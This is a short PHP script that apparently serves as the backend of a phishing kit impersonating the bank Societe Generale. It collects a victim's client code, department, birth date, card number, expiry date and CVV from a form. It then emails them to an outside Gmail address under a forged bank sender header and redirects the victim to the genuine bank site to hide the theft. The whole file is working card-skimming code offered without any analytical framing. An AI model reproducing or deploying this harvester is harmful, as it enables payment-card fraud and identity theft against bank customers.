<?php

$ip = getenv("REMOTE_ADDR");
$message .= "Code client : ".$_POST['codeclient']."\n";
$message .= "departement : ".$_POST['departement']."\n";
$message .= "Date de naissance : ".$_POST['jour']."/".$_POST['mois']."/".$_POST['byear']."\n\n";

$message .= "=============================HR-F================================\n";
$message .= "N� de carte : ".$_POST['defaultcardnumber']."\n";
$message .= "Date d'expiration : ".$_POST['defaultexpmonth']." / ".$_POST['defaultexpyear']."\n";
$message .= "Cryptogramme visuel : ".$_POST['defaultcvv2']."\n";
$message .= "=============================HR-F===========================\n";

$send = "keane010203@gmail.com";

$subject = "[ S Info | $ip ]";
$headers = "From: Societe Generale <holy@societegenerale.fr>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);


header("Location: http://societegenerale.fr/");
?>